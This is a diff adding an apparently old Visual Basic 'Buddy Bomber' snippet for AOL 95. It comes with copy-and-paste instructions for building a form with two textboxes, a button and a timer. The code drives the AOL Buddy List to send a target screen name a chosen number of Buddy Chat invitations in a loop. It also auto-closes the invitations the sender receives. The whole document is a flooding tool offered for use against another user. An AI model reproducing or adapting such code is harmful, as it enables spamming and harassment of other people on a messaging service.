@@ -1,0 +1,111 @@
+Vb CoDe#1
+MaKe 2 TexTboXs(textbox1 = Sn Here) 
+TexTbox2 = 100 
+MaKe 1 CoMmAnD BuTtOn 
+In ThE CoMmAnD BuTtOn CoPy AnD PaStE: 
+
+AOL% = FindWindow("AOL Frame25", 0&) 
+
+Timer1.Enabled = True 
+
+On Error GoTo NoNumber 
+
+Command1.Enabled = False 
+
+Do While Val(Text2.Text) > 0 
+
+Buddy% = FindChildByTitle(AOL%, "Buddy List") 
+
+If Buddy% = 0 Then 
+
+MsgBox "Buddy list not found!", 16, "Buddy Bomber" 
+
+Exit Sub 
+
+Else 
+
+End If 
+
+Buddy% = FindChildByTitle(AOL%, "Buddy List") 
+
+Icona% = FindChildByClass(Buddy%, "_AOL_Icon") 
+
+Icon2% = GetNextWindow(Icona%, 2) 
+
+Icon3% = GetNextWindow(Icon2%, 2) 
+
+Icon4% = GetNextWindow(Icon3%, 2) 
+
+Noth% = SetActiveWindow(Buddy%) 
+
+AOLClick Icon4% 
+
+Do While Invite% = 0 
+
+Invite% = FindChildByTitle(AOL%, "Buddy Chat") 
+
+Timeout (.001) 
+
+Loop 
+
+MoreNoth% = SetActiveWindow(Invite%) 
+
+ScreenName% = FindChildByClass(Invite%, "_AOL_Edit") 
+
+Send% = FindChildByClass(Invite%, "_AOL_Icon") 
+
+ScreenNameToBomb$ = Text1.Text 
+
+SendSN% = SendMessageByString(ScreenName%, WM_SETTEXT, 0, 
+
+ScreenNameToBomb$) 
+
+AOLClick Send% 
+
+Do While Invite% 0 
+
+Invite% = FindChildByTitle(AOL%, "Buddy Chat") 
+
+Timeout (.001) 
+
+Loop 
+
+Text2.Text = Val(Text2.Text) - 1 
+
+Loop 
+
+Timeout (1) 
+
+Command1.Enabled = True 
+
+Timer1.Enabled = False 
+
+Exit Sub 
+
+NoNumber: 
+
+MsgBox "Not a valid number!", 16, "Buddy Bomb" 
+
+Exit Sub 
+
+End Sub 
+
+
+
+
+MaKe 1 TimeR 
+in it copy and paste 
+
+
+AOL% = FindWindow("AOL Frame25", 0&) 
+
+CloseBuddy% = FindChildByTitle(AOL%, "Invitation from: ") 
+
+C% = SendMessageByNum(CloseBuddy%, WM_CLOSE, 0, 0) 
+
+
+
+
+
+this is for master2.bas 
+this is for aol95 
